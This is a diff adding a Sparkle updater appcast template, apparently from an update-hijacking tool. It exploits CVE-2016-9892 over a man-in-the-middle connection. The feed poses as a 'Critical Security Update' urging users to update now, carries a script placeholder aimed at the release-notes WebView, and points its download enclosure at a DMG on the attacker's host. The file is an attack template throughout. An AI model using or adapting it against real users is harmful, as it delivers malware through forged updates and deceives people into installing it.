@@ -1,0 +1,34 @@
+<?xml version="1.0" encoding="utf-8"?>
+<rss version="2.0" xmlns:sparkle="http://www.andymatuschak.org/xml-namespaces/sparkle" xmlns:dc="http://purl.org/dc/elements/1.1/">
+  <channel>
+    <title>Application Changelog</title>
+    <link><%SCHEME%>://<%DLHOST%>/appcast.xml</link>
+    <description>Most recent changes with links to updates.</description>
+    <language>en</language>
+    <item>
+      <title>Version <%VERSION%> (Critical Security Update)</title>
+      <pubDate><%PUBDATE%></pubDate>
+      <sparkle:version><%VERSION%></sparkle:version>
+      <sparkle:shortVersionString><%VERSION%></sparkle:shortVersionString>
+      <sparkle:minimumSystemVersion>10.9.0</sparkle:minimumSystemVersion>
+      <description><![CDATA[
+        <html><body>
+        <h2>Critical security update <%VERSION%></h2>
+        <p>This release fixes an important security vulnerability. Please update now.</p>
+        <!--
+          CVE-2016-9892: Sparkle renders release notes in a WebView with
+          JavaScript enabled. Over a MITM'd HTTP appcast this allows arbitrary
+          code execution. The enclosure below is served by the same MITM host.
+        -->
+        <script type="text/javascript">/* release-notes WebView JS execution vector */</script>
+        </body></html>
+      ]]></description>
+      <enclosure
+        url="<%SCHEME%>://<%DLHOST%>/update/<%RND1%>/Update_<%VERSION%>.dmg"
+        sparkle:version="<%VERSION%>"
+        sparkle:shortVersionString="<%VERSION%>"
+        length="<%DMGLEN%>"
+        type="application/octet-stream" />
+    </item>
+  </channel>
+</rss>
